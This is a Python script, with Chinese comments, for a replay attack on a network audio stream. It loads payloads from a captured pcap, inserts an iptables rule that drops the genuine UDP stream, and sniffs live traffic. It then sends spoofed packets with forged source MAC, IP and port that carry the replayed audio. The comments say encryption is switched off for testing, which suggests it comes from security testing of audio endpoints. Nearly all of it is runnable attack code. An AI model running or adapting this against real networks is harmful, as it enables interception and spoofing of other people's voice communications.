# -*- coding: utf-8 -*-
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#脚本by陈梦雅：进行音频码流的嗅探、拦截和伪造发送

#注意事项：
#测试前需要抓取网络包，然后过滤出需要伪造的音频码流，导出为pcap文件，并获取该条码流的源MAC、源IP、源发送端口及目的IP、目的发送端口；
#需要在if __name__=="__main__"下配置的变量名有：
#需要伪造的音频码流的源MAC地址S_MAC、源IP地址S_IP、源发送端口S_Port、目的IP地址D_IP、D_Port；伪造的码流从哪个网卡发出sendface；
#本脚本主要是重放音频码流达到重放攻击的目的。测试时需要注意关闭终端的多倍发送、检查数据包里是否携带扩展信息、关闭加密设置等；

#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
from winpcapy import WinPcapUtils
from winpcapy import WinPcapDevices
import winpcapy
from scapy.all import *
import struct
import os

#重新定义winpcapy的类，使得WinPcapUtils.capture_on_device_name函数可以回调指定的数据包
class MyWinPcapUtils(winpcapy.WinPcapUtils):
    @staticmethod
    def capture_on_device_name(device_name, callback, limit): #增加一个限制去停止数据包的回调，limit等于
        """
        :param device_name: the name (guid) of a device as provided by WinPcapDevices.list_devices()
        :param callback: a function to call with each intercepted packet
        """
        with winpcapy.WinPcap(device_name) as capture:
            capture.run(callback=callback, limit=limit)

#打印当前主机的网卡设备名称和描述等；根据当前打印的设备名，选择适当的网卡设备进行码流的嗅探和拦截；
def PrintDevices():
    with WinPcapDevices() as devices:
        for device in devices:
                print device.name
                print device.description

#定义全局变量datalist：用于存放音频码流载荷 i：计数，为了能循环发送datalist的内容；
global datalist
datalist=[]
global i
i=0

#获取嗅探的音频码流载荷；
#pcapfile：即提前抓取并过滤好的码流
def getdata(pcapfile):
    pcaps = rdpcap(pcapfile)
    for p in pcaps:
        raw= p["Raw"].load
        raw=str(raw)
        data=raw[12:]
        datalist.append(data)
    return datalist
    
# Example Callback function to parse IP packets
# 回调函数，回调所有通过指定网卡的数据包，实时替换目标码流的载荷信息，实现音频的重放攻击；
def packet_callback(win_pcap, param, header, pkt_data):
    global datalist,i
    global S_MAC,S_IP,S_Port,D_IP,D_Port,sendface
    ip_frame = pkt_data[14:]    #ip_frmae里的元素是ip帧里的单个字节
    src_ip = ".".join([str(ord(b)) for b in ip_frame[12:16]])   #12到15字节是源IP
    #dst_ip = ".".join([str(ord(b)) for b in ip_frame[16:20]])   #16到19字节是目的IP   
    src_port = int(ord(ip_frame[20])) * 16 * 16 + int(ord(ip_frame[21]))
    #dst_port = int(ord(ip_frame[22])) * 16 * 16 + int(ord(ip_frame[23]))

    if src_ip == S_IP and src_port == S_Port:
        #print("%s : %s -> %s : %s" % (src_ip, src_port, dst_ip, dst_port))
        seq = int(ord(ip_frame[30])) * 16 * 16 + int(ord(ip_frame[31]))
        #print seq
        if i>(len(datalist)-1):
            i=0
        datatouple=(pkt_data[42:54],datalist[i])
        data=''.join(datatouple)
        sendp(Ether(src=S_MAC)/IP(src=S_IP,dst=D_IP)/UDP(sport=S_Port,dport=D_Port)/data,iface=sendface)
        i=i+1
    
if __name__=="__main__":
    #码流信息配置
    global S_MAC,S_IP,S_Port,D_IP,D_Port,sendface
    S_MAC='ec:d6:8a:1e:7f:67'
    S_IP='172.16.176.123'
    S_Port=27997
    D_IP="172.16.178.251"
    D_Port=60068
    sendface='eth1' #伪造的音频码流从哪个网卡发出去，'eth0'或'eth1'；

    datalist=getdata("Sky-noAES-audio.pcap")
    #使用iptables截断目标码流
    command="iptables -t filter -A FORWARD -s " + S_IP + " -p UDP --sport=" + str(S_Port) + " -j DROP"
    os.system(command)
    MyWinPcapUtils.capture_on_device_name('Realtek PCIe GBE Family Controller',packet_callback,10)

